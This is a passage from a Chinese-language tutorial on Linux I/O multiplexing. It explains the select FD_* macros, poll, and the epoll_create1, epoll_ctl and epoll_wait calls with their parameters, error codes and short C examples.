<li><code>fd</code>: 要移除的文件描述符。</li>
<li><code>set</code>: 指向 <code>fd_set</code> 结构的指针。</li>
</ul>
</li>
<li><strong>用法</strong>: 当你不再需要监视某个文件描述符时，可以使用 <code>FD_CLR</code> 将其从集合中移除。</li>
</ul>
<p><strong><code>FD_ISSET</code></strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>功能</strong>: 检查指定的文件描述符是否在集合中。</li>
<li><strong>参数</strong>:<ul>
<li><code>fd</code>: 要检查的文件描述符。</li>
<li><code>set</code>: 指向 <code>fd_set</code> 结构的指针。</li>
</ul>
</li>
<li><strong>返回值</strong>: 如果文件描述符在集合中，则返回非零值；否则返回零。</li>
<li><strong>用法</strong>: 在调用 <code>select</code> 之后，使用 <code>FD_ISSET</code> 检查哪些文件描述符已就绪。</li>
</ul>
<p><strong><code>FD_SET</code></strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>功能</strong>: 将指定的文件描述符添加到集合中。</li>
<li><strong>参数</strong>:<ul>
<li><code>fd</code>: 要添加的文件描述符。</li>
<li><code>set</code>: 指向 <code>fd_set</code> 结构的指针。</li>
</ul>
</li>
<li><strong>用法</strong>: 在调用 <code>select</code> 之前，使用 <code>FD_SET</code> 将需要监视的文件描述符添加到集合中。</li>
</ul>
<p><strong><code>FD_ZERO</code></strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>功能</strong>: 清空文件描述符集合。</li>
<li><strong>参数</strong>:<ul>
<li><code>set</code>: 指向 <code>fd_set</code> 结构的指针。</li>
</ul>
</li>
<li><strong>用法</strong>: 在使用 <code>fd_set</code> 之前，通常先调用 <code>FD_ZERO</code> 初始化集合。</li>
</ul>
<p><strong>示例</strong></p>
<p>以下是一个简单的示例，演示如何使用这些宏与 <code>select</code> 结合进行 I&#x2F;O 多路复用：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    fd_set readfds;</span><br><span class="line">    <span class="type">int</span> fd = <span class="number">0</span>; <span class="comment">// 通常是标准输入</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化文件描述符集合</span></span><br><span class="line">    FD_ZERO(&amp;readfds);</span><br><span class="line">    FD_SET(fd, &amp;readfds);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置超时时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line">    timeout.tv_sec = <span class="number">5</span>;</span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 select</span></span><br><span class="line">    <span class="type">int</span> ret = select(fd + <span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;select&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Timeout occurred! No data after 5 seconds.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (FD_ISSET(fd, &amp;readfds)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Data is available to read.\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 处理可读事件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结</strong></p>
<ul>
<li><code>FD_ZERO</code> 用于初始化 <code>fd_set</code>。</li>
<li><code>FD_SET</code> 用于将文件描述符添加到 <code>fd_set</code>。</li>
<li><code>FD_CLR</code> 用于从 <code>fd_set</code> 中移除文件描述符。</li>
<li><code>FD_ISSET</code> 用于检查文件描述符是否在 <code>fd_set</code> 中。</li>
</ul>
<p>这些宏提供了一种简单的方式来管理和检查文件描述符集合，以便与 <code>select</code> 函数一起使用。</p>
</blockquote>
<h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a><code>poll</code></h3><p><code>poll</code> 是 <code>select</code> 的改进版本，克服了一些限制，如文件描述符数量限制。</p>
<h4 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><ul>
<li><code>fds</code>: 指向 <code>pollfd</code> 结构数组的指针。</li>
<li><code>nfds</code>: 数组中的元素数量。</li>
<li><code>timeout</code>: 超时时间，以毫秒为单位，<code>-1</code> 表示无限等待。</li>
</ul>
<h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><ul>
<li>成功时返回就绪的文件描述符数量。</li>
<li>失败时返回 <code>-1</code>，并设置 <code>errno</code>。</li>
</ul>
<h4 id="使用步骤-2"><a href="#使用步骤-2" class="headerlink" title="使用步骤"></a>使用步骤</h4><ol>
<li>初始化 <code>pollfd</code> 结构数组。</li>
<li>设置每个文件描述符的事件掩码。</li>
<li>调用 <code>poll</code>。</li>
<li>检查 <code>revents</code> 字段以确定哪些文件描述符已就绪。</li>
</ol>
<p><strong>常用事件类型</strong></p>
<ol>
<li><strong>POLLIN</strong><ul>
<li>描述：表示对应的文件描述符可以读（包括普通文件、管道、网络套接字等）。</li>
<li>用途：常用于检测套接字是否有数据可读。</li>
</ul>
</li>
<li><strong>POLLOUT</strong><ul>
<li>描述：表示对应的文件描述符可以写。</li>
<li>用途：常用于检测套接字是否可以发送数据。</li>
</ul>
</li>
<li><strong>POLLPRI</strong><ul>
<li>描述：表示对应的文件描述符有紧急数据可读（带外数据）。</li>
<li>用途：用于检测紧急数据的到达。</li>
</ul>
</li>
<li><strong>POLLERR</strong><ul>
<li>描述：表示对应的文件描述符发生错误。</li>
<li>用途：用于检测文件描述符的错误状态。</li>
<li>注意：这是一个输出事件，不需要在<code>poll</code>调用前设置。</li>
</ul>
</li>
<li><strong>POLLHUP</strong><ul>
<li>描述：表示对应的文件描述符被挂起。</li>
<li>用途：用于检测挂起状态。</li>
<li>注意：这是一个输出事件，不需要在<code>poll</code>调用前设置。</li>
</ul>
</li>
<li><strong>POLLNVAL</strong><ul>
<li>描述：表示对应的文件描述符无效。</li>
<li>用途：用于检测无效的文件描述符。</li>
<li>注意：这是一个输出事件，不需要在<code>poll</code>调用前设置。</li>
</ul>
</li>
</ol>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">fds</span>[1];</span></span><br><span class="line">fds[<span class="number">0</span>].fd = sockfd;</span><br><span class="line">fds[<span class="number">0</span>].events = POLLIN;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = poll(fds, <span class="number">1</span>, <span class="number">5000</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fds[<span class="number">0</span>].revents &amp; POLLIN) &#123;</span><br><span class="line">        <span class="comment">// 处理可读事件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a><code>epoll</code></h3><p><code>epoll</code> 是 Linux 特有的 I&#x2F;O 多路复用机制，适用于大规模文件描述符监视。</p>
<h4 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h4><ul>
<li><p><code>epoll_create1</code>：创建一个 epoll 实例。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_create1</span><span class="params">(<span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>epoll_create1</code>是Linux系统调用，用于创建一个新的<code>epoll</code>实例。它是<code>epoll_create</code>的扩展版本，允许使用标志来控制epoll实例的行为。以下是<code>epoll_create1</code>函数的参数详解：</p>
<p><strong>参数详解</strong></p>
<ul>
<li><p><strong><code>flags</code></strong>: 这是一个整数，用于指定epoll实例的行为。可以使用以下标志：</p>
</li>
<li><p><strong><code>EPOLL_CLOEXEC</code></strong>: 这个标志用于设置文件描述符的<code>FD_CLOEXEC</code>标志。这意味着在执行<code>exec</code>系列函数时，文件描述符将自动关闭。使用这个标志可以避免文件描述符泄漏到子进程中。</p>
</li>
<li><p><strong>其他值</strong>: 当前<code>epoll_create1</code>只支持<code>EPOLL_CLOEXEC</code>标志。如果传递其他值，可能会导致错误。</p>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时，返回一个新的epoll文件描述符。</li>
<li>失败时，返回<code>-1</code>并设置<code>errno</code>以指示错误类型。</li>
</ul>
<p><strong>错误</strong></p>
<ul>
<li><strong><code>EINVAL</code></strong>: <code>flags</code>参数不为零且不是<code>EPOLL_CLOEXEC</code>。</li>
<li><strong><code>EMFILE</code></strong>: 进程已经打开了太多文件描述符。</li>
<li><strong><code>ENFILE</code></strong>: 系统范围内已经打开了太多文件描述符。</li>
<li><strong><code>ENOMEM</code></strong>: 内存不足，无法分配新的epoll实例。</li>
</ul>
<p><strong>使用示例</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> epoll_fd = epoll_create1(EPOLL_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll_create1&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用epoll_fd进行后续的epoll操作</span></span><br><span class="line"></span><br><span class="line">    close(epoll_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结</strong></p>
<p><code>epoll_create1</code>函数是创建epoll实例的推荐方法，因为它支持<code>EPOLL_CLOEXEC</code>标志，可以帮助避免文件描述符泄漏到子进程中。通过理解和正确使用这个函数，可以有效管理文件描述符和事件通知机制。</p>
</li>
<li><p><code>epoll_ctl</code>：控制 epoll 实例中的文件描述符。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>epoll_ctl</code>是用于控制epoll实例的函数，它允许将文件描述符添加到epoll实例中、从epoll实例中删除，或者修改已经在epoll实例中的文件描述符的事件。以下是<code>epoll_ctl</code>函数的参数详解：</p>
<p><strong>参数详解</strong></p>
<ul>
<li><p><strong><code>epfd</code></strong>: </p>
<ul>
<li>这是一个epoll实例的文件描述符，由<code>epoll_create</code>或<code>epoll_create1</code>返回。</li>
<li>它指定了要操作的epoll实例。</li>
</ul>
</li>
<li><p><strong><code>op</code></strong>:</p>
<ul>
<li>这是一个指定操作类型的整数。可以是以下之一：<ul>
<li><strong><code>EPOLL_CTL_ADD</code></strong>: 将文件描述符<code>fd</code>添加到epoll实例中，并监听由<code>event</code>参数指定的事件。</li>
<li><strong><code>EPOLL_CTL_MOD</code></strong>: 修改已经在epoll实例中的文件描述符<code>fd</code>的事件类型为<code>event</code>指定的事件。</li>
<li><strong><code>EPOLL_CTL_DEL</code></strong>: 从epoll实例中删除文件描述符<code>fd</code>。<code>event</code>参数在此操作中被忽略，可以传递<code>NULL</code>。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong><code>fd</code></strong>:</p>
<ul>
<li>这是要添加、修改或删除的文件描述符。</li>
<li>它通常是打开的文件、socket等的文件描述符。</li>
</ul>
</li>
<li><p><strong><code>event</code></strong>:</p>
<ul>
<li><p>这是一个指向<code>epoll_event</code>结构的指针，用于指定感兴趣的事件和相关的数据。</p>
</li>
<li><p>当<code>op</code>为<code>EPOLL_CTL_ADD</code>或<code>EPOLL_CTL_MOD</code>时，<code>event</code>不能为<code>NULL</code>。</p>
</li>
<li><p><code>epoll_event</code>结构定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> events;    <span class="comment">// Epoll events</span></span><br><span class="line">    <span class="type">epoll_data_t</span> data;  <span class="comment">// User data variable</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">epoll_data</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>        *ptr;</span><br><span class="line">    <span class="type">int</span>          fd;</span><br><span class="line">    <span class="type">uint32_t</span>     u32;</span><br><span class="line">    <span class="type">uint64_t</span>     u64;</span><br><span class="line">&#125; <span class="type">epoll_data_t</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><strong><code>events</code></strong>: 指定感兴趣的事件类型，如<code>EPOLLIN</code>（可读）、<code>EPOLLOUT</code>（可写）、<code>EPOLLET</code>（边缘触发）等。</p>
</li>
<li><p><strong><code>data</code></strong>: 一个联合体，可以存储用户数据，如文件描述符、指针等，方便在事件发生时识别。</p>
</li>
<li><p><strong>常用事件类型</strong><br><strong>EPOLLIN</strong></p>
<p>描述：表示对应的文件描述符可以读（包括普通文件、管道、网络套接字等）。<br>用途：常用于检测套接字是否有数据可读。<br><strong>EPOLLOUT</strong></p>
<p>描述：表示对应的文件描述符可以写。<br>用途：常用于检测套接字是否可以发送数据。<br><strong>EPOLLRDHUP</strong></p>
<p>描述：表示对端关闭连接或半关闭连接。<br>用途：用于检测对端是否关闭连接（适用于套接字）。<br><strong>EPOLLPRI</strong></p>
<p>描述：表示对应的文件描述符有紧急数据可读（带外数据）。<br>用途：用于检测紧急数据的到达。<br><strong>EPOLLERR</strong></p>
<p>描述：表示对应的文件描述符发生错误。<br>用途：用于检测文件描述符的错误状态。<br><strong>EPOLLHUP</strong></p>
<p>描述：表示对应的文件描述符被挂起。<br>用途：用于检测挂起状态。<br><strong>EPOLLET</strong></p>
<p>描述：将文件描述符设置为边缘触发模式（Edge Triggered）。<br>用途：用于提高性能，通过减少事件通知次数。<br><strong>EPOLLONESHOT</strong></p>
<p>描述：事件只触发一次，触发后需要重新设置。<br>用途：用于控制事件的触发频率。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时，返回<code>0</code>。</li>
<li>失败时，返回<code>-1</code>并设置<code>errno</code>以指示错误类型。</li>
</ul>
<p><strong>错误</strong></p>
<ul>
<li><strong><code>EBADF</code></strong>: <code>epfd</code>或<code>fd</code>不是有效的文件描述符。</li>
<li><strong><code>EINVAL</code></strong>: <code>epfd</code>不是一个epoll文件描述符，或者<code>op</code>不合法。</li>
<li><strong><code>ENOMEM</code></strong>: 内存不足，无法完成请求。</li>
<li><strong><code>EPERM</code></strong>: <code>fd</code>指向的文件不支持epoll操作。</li>
<li><strong><code>EEXIST</code></strong>: <code>op</code>为<code>EPOLL_CTL_ADD</code>，但<code>fd</code>已经在epoll实例中。</li>
<li><strong><code>ENOENT</code></strong>: <code>op</code>为<code>EPOLL_CTL_MOD</code>或<code>EPOLL_CTL_DEL</code>，但<code>fd</code>不在epoll实例中。</li>
</ul>
<p><strong>使用示例</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> epoll_fd = epoll_create1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll_create1&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = ...; <span class="comment">// 假设这是一个有效的文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">    event.events = EPOLLIN;</span><br><span class="line">    event.data.fd = fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &amp;event) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll_ctl: EPOLL_CTL_ADD&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行其他操作...</span></span><br><span class="line"></span><br><span class="line">    close(epoll_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>epoll_wait</code>：等待事件的发生。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event *events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数详解</strong></p>
<ul>
<li><p><strong><code>epfd</code></strong>:</p>
<ul>
<li>这是一个epoll实例的文件描述符，由<code>epoll_create</code>或<code>epoll_create1</code>返回。</li>
<li>它指定了要等待事件的epoll实例。</li>
</ul>
</li>
<li><p><strong><code>events</code></strong>:</p>
<ul>
<li>这是一个指向<code>epoll_event</code>结构数组的指针，用于存储发生事件的文件描述符及其相关信息。</li>
<li>调用者需要分配这个数组，并通过<code>maxevents</code>参数指定数组的大小。</li>
</ul>
</li>
<li><p><strong><code>maxevents</code></strong>:</p>
<ul>
<li>这是一个整数，指定<code>events</code>数组中可以存储的最大事件数。</li>
<li>这个值必须大于零，并且通常设置为<code>events</code>数组的大小。</li>
</ul>
</li>
<li><p><strong><code>timeout</code></strong>:</p>
<ul>
<li>这是一个整数，指定等待事件的超时时间，以毫秒为单位。</li>
<li>可能的值包括：<ul>
<li><strong><code>&gt; 0</code></strong>: 等待指定的毫秒数。</li>
<li><strong><code>0</code></strong>: 不等待，立即返回。这被称为“非阻塞模式”。</li>
<li><strong><code>-1</code></strong>: 无限期等待，直到至少有一个事件发生。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时，返回准备就绪的文件描述符的数量（可以为零）。</li>
<li>失败时，返回<code>-1</code>并设置<code>errno</code>以指示错误类型。</li>
</ul>
<p><strong>错误</strong></p>
<ul>
<li><strong><code>EBADF</code></strong>: <code>epfd</code>不是有效的文件描述符。</li>
<li><strong><code>EFAULT</code></strong>: <code>events</code>指向的内存无法访问。</li>
<li><strong><code>EINTR</code></strong>: 调用被信号中断。</li>
<li><strong><code>EINVAL</code></strong>: <code>epfd</code>不是一个epoll文件描述符，或者<code>maxevents</code>小于等于零。</li>
</ul>
<p><strong>使用示例</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_EVENTS 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> epoll_fd = epoll_create1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll_create1&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">MAX_EVENTS</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (nfds == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll_wait&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (events[i].events &amp; EPOLLIN) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File descriptor %d is ready to read\n&quot;</span>, events[i].data.fd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(epoll_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结</strong></p>
<p><code>epoll_wait</code>是<code>epoll API</code>中用于等待事件的关键函数。它提供了一种高效的方式来处理大量并发连接，通过理解其参数和返回值，可以有效监控和响应文件描述符上的事件。</p>
</li>
</ul>
<h4 id="使用步骤-3"><a href="#使用步骤-3" class="headerlink" title="使用步骤"></a>使用步骤</h4><ol>
<li>使用 <code>epoll_create1</code> 创建 epoll 实例。</li>
<li>使用 <code>epoll_ctl</code> 添加、修改或删除文件描述符。</li>
<li>使用 <code>epoll_wait</code> 等待事件发生。</li>
</ol>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> epfd = epoll_create1(<span class="number">0</span>);</span><br><span 